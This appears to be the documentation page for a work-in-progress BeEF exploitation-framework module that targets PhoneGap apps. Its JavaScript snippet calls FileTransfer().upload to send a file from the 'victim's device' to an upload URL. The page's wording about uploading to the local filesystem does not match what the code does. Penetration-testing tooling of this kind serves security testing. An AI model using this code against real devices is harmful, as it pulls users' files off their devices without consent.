## Summary

* **Objective**: Upload a file to the victim's device via PhoneGap API
* **Authors**: mh
* **Browsers**: All (with PhoneGap)

* [Code](https://github.com/beefproject/beef/tree/master/modules/phonegap/phonegap_file_upload)

## Internal Working

This module uses the `FileTransfer()` method in PhoneGap to upload file to local filesystem.

It's still work in progress. (There are TODO items in command.js)

```js

var options = new FileUploadOptions();
options.fileKey="content";

// grab filename from the filepath
re = new RegExp("([^/]*)$");
options.fileName = file_path.match(re)[0];
//options.fileName="myrecording.wav";// TODO grab from filepath

// needed?
var params = new Object();
params.value1 = "test";
params.value2 = "param";
options.params = params;
// needed?

var ft = new FileTransfer();
ft.upload(file_path, upload_url, win, fail, options);

```

## Feedback

